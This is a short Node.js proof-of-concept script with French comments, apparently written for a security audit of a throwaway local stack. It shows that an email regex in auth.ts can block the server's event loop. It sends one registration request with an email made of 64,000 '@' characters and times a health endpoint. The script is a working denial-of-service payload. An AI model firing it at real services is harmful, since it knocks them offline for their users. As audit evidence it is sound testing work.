// Preuve de blocage de la boucle d'événements par l'expression EMAIL_RE (auth.ts:18), pile jetable.
// Un client sonde /api/health toutes les 100 ms ; un autre envoie UNE inscription dont l'email est
// n fois « @ », avec le code d'invitation de la pile jetable.
const base = process.argv[2] ?? 'http://127.0.0.1:8797';
const n = Number(process.argv[3] ?? 64000);
const invite = process.argv[4] ?? 'audit05-code';

const probes = [];
let stop = false;
async function poll() {
  while (!stop) {
    const t0 = performance.now();
    try { await fetch(`${base}/api/health`); } catch { /* */ }
    probes.push({ at: Date.now(), ms: Math.round(performance.now() - t0) });
    await new Promise((r) => setTimeout(r, 100));
  }
}
const poller = poll();
await new Promise((r) => setTimeout(r, 1000));
const body = JSON.stringify({ email: '@'.repeat(n), password: 'audit05-motdepasse', invite_code: invite });
const t0 = performance.now();
const sentAt = Date.now();
const res = await fetch(`${base}/api/auth/register`, { method: 'POST', headers: { 'content-type': 'application/json' }, body });
const text = await res.text();
const registerMs = Math.round(performance.now() - t0);
await new Promise((r) => setTimeout(r, 1500));
stop = true;
await poller;
const before = probes.filter((p) => p.at < sentAt).map((p) => p.ms);
const during = probes.filter((p) => p.at >= sentAt).map((p) => p.ms);
console.log(JSON.stringify({
  emailLength: n, bodyBytes: body.length, registerStatus: res.status, registerBody: text.slice(0, 120), registerMs,
  healthBefore_maxMs: Math.max(...before), healthDuring_maxMs: Math.max(...during), healthProbesDuring: during.length,
}, null, 2));
